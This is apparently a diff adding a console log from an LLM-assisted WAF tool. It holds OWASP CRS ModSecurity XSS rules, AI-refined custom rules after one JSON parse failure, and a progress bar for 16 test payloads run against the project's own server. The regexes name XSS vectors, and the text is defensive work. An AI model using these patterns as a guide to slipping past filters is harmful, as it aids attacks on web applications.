+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx ((?:\[[^\]]*\]|Reflect)[^\.]*\.).*(?:map|sort|apply)[^\.]*\..*call[^`]*`.*`"  "id:941400, phase:2, block, capture, t:none,t:urlDecodeUni,t:compressWhitespace, msg:'XSS JavaScript function without parentheses', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/1', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"
+	SecRule TX:DETECTION_PARANOIA_LEVEL "@lt 2" "id:941013,phase:1,pass,nolog,tag:'OWASP_CRS',ver:'OWASP_CRS/4.26.0-dev',skipAfter:END-REQUEST-941-APPLICATION-ATTACK-XSS"
+	SecRule TX:DETECTION_PARANOIA_LEVEL "@lt 2" "id:941014,phase:2,pass,nolog,tag:'OWASP_CRS',ver:'OWASP_CRS/4.26.0-dev',skipAfter:END-REQUEST-941-APPLICATION-ATTACK-XSS"
+	SecRule REQUEST_FILENAME|REQUEST_HEADERS:Referer "@detectXSS"  "id:941101, phase:1, block, capture, t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls, msg:'XSS Attack Detected via libinjection', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-multi', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/2', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_HEADERS:User-Agent|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx (?i)\b(?:s(?:tyle|rc)|href)\b[\s\S]*?="  "id:941150, phase:2, block, capture, t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls, msg:'XSS Filter - Category 5: Disallowed HTML Attributes', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-multi', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/2', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@contains -->"  "id:941181, phase:2, block, capture, t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:lowercase,t:removeNulls, msg:'Node-Validator Deny List Keywords', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-multi', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/2', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx <(?:a(?:bbr|cronym|ddress|pplet|rea|udioscope)?|b(?:ase(?:front)?|do|gsound|ig|l(?:(?:ackfac|ockquot)e|ink)|ody|[qr]|utton)?|c(?:aption|enter|ite|o(?:de|l(?:group)?|mment))|d(?:[dt]|e?l|fn|i[rv])|em(?:bed)?|f(?:ieldset|n|o(?:nt|rm)|rame(?:set)?)|h(?:[1r]|ead|tml)|i(?:frame|layer|mg|n(?:put|s)|sindex)?|k(?:db|eygen)|l(?:a(?:bel|yer)|egend|i(?:mittext|nk|sting)?)|m(?:a(?:p|rquee)|e(?:nu|ta)|ulticol)|no(?:br|embed|frames|s(?:cript|martquotes))|o(?:bject|l|pt(?:group|ion))|p(?:aram|laintext|re)?|q|r(?:t|uby)|s(?:amp|cript|e(?:lect|rver)|hadow|idebar|mall|pa(?:cer|n)|t(?:r(?:ike|ong)|yle)|u[bp])?|t(?:(?:ab|it)le|body|[dr]|extarea|(?:foo)?t|h(?:ead)?)|ul?|(?:va|wb)r|xm[lp])[^0-9A-Z_a-z]"  "id:941320, phase:2, block, capture, t:none,t:jsDecode,t:lowercase, msg:'Possible XSS Attack Detected - HTML Tag Handler', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-multi', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/2', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242/63', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx (?i)[\"'] *(?:[^ '0-:_a-z~]|in).*?(?:(?:l|\x5cu006C)(?:o|\x5cu006F)(?:c|\x5cu0063)(?:a|\x5cu0061)(?:t|\x5cu0074)(?:i|\x5cu0069)(?:o|\x5cu006F)(?:n|\x5cu006E)|(?:n|\x5cu006E)(?:a|\x5cu0061)(?:m|\x5cu006D)(?:e|\x5cu0065)|(?:o|\x5cu006F)(?:n|\x5cu006E)(?:e|\x5cu0065)(?:r|\x5cu0072)(?:r|\x5cu0072)(?:o|\x5cu006F)(?:r|\x5cu0072)|(?:v|\x5cu0076)(?:a|\x5cu0061)(?:l|\x5cu006C)(?:u|\x5cu0075)(?:e|\x5cu0065)(?:O|\x5cu004F)(?:f|\x5cu0066)).*?="  "id:941330, phase:2, block, capture, t:none,t:htmlEntityDecode,t:compressWhitespace, msg:'IE XSS Filters - Attack Detected', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-multi', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/2', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx (?i)[\"\'][ ]*(?:[^a-z0-9~_:\' ]|in).+?[.].+?="  "id:941340, phase:2, block, capture, t:none,t:htmlEntityDecode,t:compressWhitespace, msg:'IE XSS Filters - Attack Detected', logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'platform-multi', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/2', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}'"
+	SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|REQUEST_FILENAME|XML:/* "@rx \{\{.*?}}"  "id:941380, phase:2, block, t:none, msg:'AngularJS client side template injection detected', logdata:'Matched Data: Suspicious payload found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}', tag:'application-multi', tag:'language-multi', tag:'attack-xss', tag:'xss-perf-disable', tag:'paranoia-level/2', tag:'OWASP_CRS', tag:'OWASP_CRS/ATTACK-XSS', tag:'capec/1000/152/242/63', ver:'OWASP_CRS/4.26.0-dev', severity:'CRITICAL', setvar:'tx.xss_score=+%{tx.critical_anomaly_score}', setvar:'tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}'"
+	SecRule TX:DETECTION_PARANOIA_LEVEL "@lt 3" "id:941015,phase:1,pass,nolog,tag:'OWASP_CRS',ver:'OWASP_CRS/4.26.0-dev',skipAfter:END-REQUEST-941-APPLICATION-ATTACK-XSS"
+	SecRule TX:DETECTION_PARANOIA_LEVEL "@lt 3" "id:941016,phase:2,pass,nolog,tag:'OWASP_CRS',ver:'OWASP_CRS/4.26.0-dev',skipAfter:END-REQUEST-941-APPLICATION-ATTACK-XSS"
+	SecRule TX:DETECTION_PARANOIA_LEVEL "@lt 4" "id:941017,phase:1,pass,nolog,tag:'OWASP_CRS',ver:'OWASP_CRS/4.26.0-dev',skipAfter:END-REQUEST-941-APPLICATION-ATTACK-XSS"
+	SecRule TX:DETECTION_PARANOIA_LEVEL "@lt 4" "id:941018,phase:2,pass,nolog,tag:'OWASP_CRS',ver:'OWASP_CRS/4.26.0-dev',skipAfter:END-REQUEST-941-APPLICATION-ATTACK-XSS"
+	SecMarker "END-REQUEST-941-APPLICATION-ATTACK-XSS"
+	SecRule ARGS "@contains there is the attack" "id:1000003,phase:2,deny,status:403,log,msg:'Test block phrase'"
+[REFINE-RULES] CLAUDE RESPONSE CONTENT:
+{"refined_rules":[{"rule":"SecRule ARGS|REQUEST_URI|REQUEST_HEADERS|REQUEST_COOKIES "@rx \\b(?:activexobject|xmlhttp|msxml2\\.xmlhttp)\\b|\\bonreadystatechange\\b\\s*=|\\bxhr\\s*=\\s*new\\b|\\bopen\\s*\\(\\s*[\"'`]get[\"'`]" "id:210004,phase:2,deny,status:403,log,auditlog,t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,t:lowercase,t:compressWhitespace,msg:'XSS ActiveX XMLHttp pattern detected',logdata:'%{MATCHED_VAR_NAME}=%{MATCHED_VAR}',tag:'attack-xss',severity:'CRITICAL',setvar:'tx.xss_score=+%{tx.critical_anomaly_score}',setvar:'tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}'"","instructions":"Deploy after existing rule 941390. This rule targets ActiveX/XMLHttp XSS vectors not covered by existing CRS rules. The alert/confirm/prompt portion was removed as it is already covered by existing rule 941390."},{"rule":"SecRule ARGS|REQUEST_URI|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?:(?:%25){2,}|(?:&#(?:x[0-9a-f]{2,5}|\\d{2,7});){3,}|(?:%u[0-9a-f]{4}){2,}|(?:[0-9a-f]{2}%){4,})" "id:210005,phase:2,log,auditlog,pass,t:none,t:lowercase,msg:'Anomaly: excessive multi-layer encoding indicative of obfuscation',logdata:'%{MATCHED_VAR_NAME}=%{MATCHED_VAR}',tag:'attack-obfuscation',severity:'WARNING',setvar:'tx.anomaly_score=+5'"","instructions":"Deploy as a scoring/detection rule (pass action). Flags excessive multi-layer encoding not specifically covered by existing CRS XSS rules. Feeds into anomaly threshold rule 210007."},{"rule":"SecRule TX:ANOMALY_SCORE "@ge 10" "id:210007,phase:2,deny,status:403,log,auditlog,t:none,msg:'Inbound request blocked by XSS/obfuscation anomaly threshold',tag:'attack-anomaly',severity:'CRITICAL'"","instructions":"Deploy last in the XSS section, after all scoring rules including 210005. Only fires when cumulative anomaly score from obfuscation detection rules reaches threshold. Complements the existing CRS inbound anomaly scoring mechanism with a secondary threshold specific to obfuscation signals."}],"comparison_notes":"Candidate rule 210000 (SecAction normalization setup) was dropped: CRS rules already apply identical transformations per-rule and a global normalization action is unnecessary and architecturally incorrect for ModSecurity. Rule 210001 was dropped: its patterns (script/svg/img/body/iframe/audio tags, javascript: URIs, on* event handlers) are fully covered by existing rules 941100, 941110, 941120, 941160, 941170. Rule 210002 was dropped: fully overlaps with 941110 (script tags) and 941120/941160 (on* event handlers on tags). Rule 210003 was dropped: comment/separator obfuscation before event handlers is handled by existing 941120 and 941160 which already use comprehensive character class matching. Rule 210004 was trimmed: alert/confirm/prompt already covered by 941390; only the ActiveX/XMLHttp portion adds new coverage. Rule 210006 (unusual Unicode density) was dropped as over-broad and high false-positive risk without sufficient precision. Rule 210007 is retained as a secondary anomaly threshold gate fed by 210005. Duplicate urlDecodeUni transformations in candidate rules were deduplicated to a single instance.","coverage_analysis":"The refined rule set adds targeted coverage for ActiveX/XMLHttp-based XSS vectors (210004), excessive multi-layer encoding obfuscation detection (210005), and a cumulative obfuscation anomaly threshold block (210007). These complement the existing comprehensive CRS 941xxx XSS rule chain without duplicating its tag, event-handler, attribute, javascript-URI, or JS-method coverage."}
+============================================================
+Traceback (most recent call last):
+  File "K:\Workspace\bku\LLM4WAF\src\core\pipelines\defend.py", line 353, in _6_refine_rules
+    refined_rules = json.loads(content)["refined_rules"]
+                    ^^^^^^^^^^^^^^^^^^^
+  File "K:\AppPortable\Python\3.12.0\Lib\json\__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "K:\AppPortable\Python\3.12.0\Lib\json\decoder.py", line 338, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "K:\AppPortable\Python\3.12.0\Lib\json\decoder.py", line 354, in raw_decode
+    obj, end = self.scan_once(s, idx)
+               ^^^^^^^^^^^^^^^^^^^^^^
+json.decoder.JSONDecodeError: Expecting ',' delimiter: line 1 column 86 (char 85)
+[REFINE-RULES] #1/5 failed: Expecting ',' delimiter: line 1 column 86 (char 85)
+[REFINE] Successfully refined rules on attempt #2
+	SecRule ARGS|ARGS_NAMES|REQUEST_URI|REQUEST_HEADERS|REQUEST_COOKIES|XML:/* "@rx (?:<|%3c)\s*(?:script|svg|img|body|iframe|audio)\b|(?:src|href)\s*=\s*["'`]?\s*javascript\s*:|\bon[a-z]{3,24}\b\s*[\x00-\x20"'`;/(),-]*=" "id:210001,phase:2,deny,status:403,log,auditlog,t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,t:lowercase,t:compressWhitespace,msg:'XSS normalized tag or event-handler pattern detected',logdata:'%{MATCHED_VAR_NAME}=%{MATCHED_VAR}',tag:'attack-xss',severity:'CRITICAL'"
+		Instructions: Deploy after existing rule 941400. This rule adds normalized post-transform detection of HTML tags and event handlers not caught by libinjection or pattern-based rules at PL1. The duplicate urlDecodeUni transformation has been removed. The &lt; HTML entity variant is handled by htmlEntityDecode transform, so the literal &lt; branch is dropped. Ensure this fires before anomaly scoring rules.
+	SecRule ARGS|ARGS_NAMES|REQUEST_URI|REQUEST_HEADERS|REQUEST_COOKIES|XML:/* "@rx \b(?:activexobject|xmlhttp|msxml2\.xmlhttp)\b|\bonreadystatechange\b\s*=|\bxhr\s*=\s*new\b" "id:210004,phase:2,deny,status:403,log,auditlog,t:none,t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls,t:lowercase,t:compressWhitespace,msg:'XSS ActiveX or XMLHttp pattern detected',logdata:'%{MATCHED_VAR_NAME}=%{MATCHED_VAR}',tag:'attack-xss',severity:'CRITICAL'"
+		Instructions: Deploy after rule 210001. The alert/confirm/prompt portion of the original candidate rule 210004 is already covered by existing rule 941390. This refined version retains only the ActiveX and XMLHttp patterns that have no existing coverage. Duplicate urlDecodeUni removed.
+	SecRule ARGS|ARGS_NAMES|REQUEST_URI|REQUEST_HEADERS|REQUEST_COOKIES "@rx (?:(?:%25){2,}|(?:&#(?:x[0-9a-f]{2,5}|\d{2,7});){3,}|(?:%u[0-9a-f]{4}){2,}|(?:[0-9a-f]{2}%){4,})" "id:210005,phase:2,pass,log,auditlog,t:none,t:lowercase,msg:'Anomaly: excessive multi-layer encoding indicative of obfuscation',logdata:'%{MATCHED_VAR_NAME}=%{MATCHED_VAR}',tag:'attack-obfuscation',severity:'WARNING',setvar:'tx.anomaly_score=+%{tx.warning_anomaly_score}'"
+		Instructions: Deploy as a scoring-only pass rule. Changed hardcoded score increment to use tx.warning_anomaly_score for consistency with CRS scoring conventions. No block action here; blocking is delegated to the anomaly threshold rule 210007. XML:/* removed to avoid performance overhead on body inspection for a pass-only scoring rule.
+	SecRule TX:ANOMALY_SCORE "@ge 10" "id:210007,phase:2,deny,status:403,log,auditlog,t:none,msg:'Inbound request blocked by XSS obfuscation anomaly threshold',tag:'attack-anomaly',severity:'CRITICAL'"
+		Instructions: Deploy as the final anomaly threshold enforcement rule after all scoring rules in this custom set. Ensure tx.anomaly_score is initialized to 0 in CRS configuration or via SecAction before phase 2. This rule only fires when custom anomaly score increments from rule 210005 and 210006 accumulate to threshold 10 or above, complementing the CRS inbound anomaly scoring already in place.
+127.0.0.1 - - [10/May/2026 15:30:31] "POST /api/defend/6-refine-rules HTTP/1.1" 200 -
+127.0.0.1 - - [10/May/2026 15:35:24] "OPTIONS /api/attack/3-test HTTP/1.1" 200 -
+
+[TEST-ATTACK] 16 payloads on modsec.llmshield.click:   0%|                                                  | 0/16 [00:00<?, ?it/s]
+[TEST-ATTACK] 16 payloads on modsec.llmshield.click:   6%|##6                                       | 1/16 [00:01<00:25,  1.68s/it]
+[TEST-ATTACK] 16 payloads on modsec.llmshield.click:  12%|#####2                                    | 2/16 [00:02<00:20,  1.47s/it]
+[TEST-ATTACK] 16 payloads on modsec.llmshield.click:  19%|#######8                                  | 3/16 [00:04<00:17,  1.35s/it]
+[TEST-ATTACK] 16 payloads on modsec.llmshield.click:  25%|##########5                               | 4/16 [00:06<00:18,  1.56s/it]
+[TEST-ATTACK] 16 payloads on modsec.llmshield.click:  31%|#############1                            | 5/16 [00:16<00:52,  4.74s/it]
+[TEST-ATTACK] 16 payloads on modsec.llmshield.click:  38%|###############7                          | 6/16 [00:17<00:35,  3.53s/it]
+[TEST-ATTACK] 16 payloads on modsec.llmshield.click:  44%|##################3                       | 7/16 [00:18<00:24,  2.76s/it]
+[TEST-ATTACK] 16 payloads on modsec.llmshield.click:  50%|#####################                     | 8/16 [00:19<00:17,  2.24s/it]
+[TEST-ATTACK] 16 payloads on modsec.llmshield.click:  56%|#######################6                  | 9/16 [00:21<00:14,  2.06s/it]
+[TEST-ATTACK] 16 payloads on modsec.llmshield.click:  62%|#########################6               | 10/16 [00:22<00:10,  1.78s/it]
+[TEST-ATTACK] 16 payloads on modsec.llmshield.click:  69%|############################1            | 11/16 [00:23<00:07,  1.59s/it]
+[TEST-ATTACK] 16 payloads on modsec.llmshield.click:  75%|##############################7          | 12/16 [00:25<00:05,  1.47s/it]
+[TEST-ATTACK] 16 payloads on modsec.llmshield.click:  81%|#################################3       | 13/16 [00:26<00:04,  1.37s/it]
+[TEST-ATTACK] 16 payloads on modsec.llmshield.click:  88%|###################################8     | 14/16 [00:28<00:03,  1.54s/it]
+[TEST-ATTACK] 16 payloads on modsec.llmshield.click:  94%|######################################4  | 15/16 [00:29<00:01,  1.48s/it]
+[TEST-ATTACK] 16 payloads on modsec.llmshield.click: 100%|#########################################| 16/16 [00:30<00:00,  1.37s/it]
+[TEST-ATTACK] 16 payloads on modsec.llmshield.click: 100%|#########################################| 16/16 [00:30<00:00,  1.92s/it]
+127.0.0.1 - - [10/May/2026 15:49:06] "POST /api/attack/3-test HTTP/1.1" 200 -
